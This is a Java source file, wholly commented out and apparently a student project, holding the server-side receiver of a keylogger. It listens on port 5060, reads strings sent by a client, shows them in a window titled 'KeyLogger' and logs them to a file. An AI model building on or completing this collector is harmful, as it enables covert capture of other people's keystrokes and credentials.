package Client;

//public class ReceiveKeyLogger extends JPanel {}
//    public ServerSocket welcomeSocket;
//    public Socket connectionSocket;
//
//        public static Server sv;

//    static {
//        try {
//            sv = new Server();
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
//    }

//    public static Socket socket = sv.connectionSocket;
////
//    public static ServerSocket serverSocket = sv.welcomeSocket;

//    static {
//        try {
//            serverSocket = new ServerSocket();
//        }
//    }




//    public static void main(String[] args) throws IOException {
//        System.out.println("hi");
//
//        ServerSocket welcomeSocket = new ServerSocket(5060);
//        Socket connectionSocket = welcomeSocket.accept();
//        JPanel panel = new JPanel();
//        panel.setOpaque(true);
//
//        JFrame frame = new JFrame("KeyLogger");
//        frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
//        frame.setContentPane(panel);
//        frame.pack();
//        frame.setVisible(true);
//        System.out.println("thanh cong");
//        ObjectInputStream objectInputStream = new ObjectInputStream(connectionSocket.getInputStream());
//        FileWriter filewriter = new FileWriter("ServerOutputFile.txt");
//        BufferedWriter bufferedWriter = new BufferedWriter(filewriter);
//
//        /*
//        Here server records all the data received from the client
//         */
//        String str = "";
//        JTextArea textArea = new JTextArea(str);
//        textArea.setLineWrap(true);
//        textArea.setWrapStyleWord(true);
//        JScrollPane scrollPane = new JScrollPane(textArea);
//
////        String appendText = "jumps over the lazy dog.";
//
//        while ( connectionSocket.isConnected()){
//            str = objectInputStream.readUTF();
//            System.out.println("Received : " + str );
//            textArea.append(str + "\r\n");
//            Dimension preferred = frame.getPreferredSize();
//            frame.setPreferredSize(new Dimension(500, 200));
//            frame.setLayout(new BorderLayout());
//            frame.add(scrollPane, BorderLayout.CENTER);
//
//            bufferedWriter.write(str + "\r\n");
//            bufferedWriter.flush();
//        }
//        bufferedWriter.close();
//        welcomeSocket.close();
//
//
//        System.out.println("Connection closed");
//    }
//}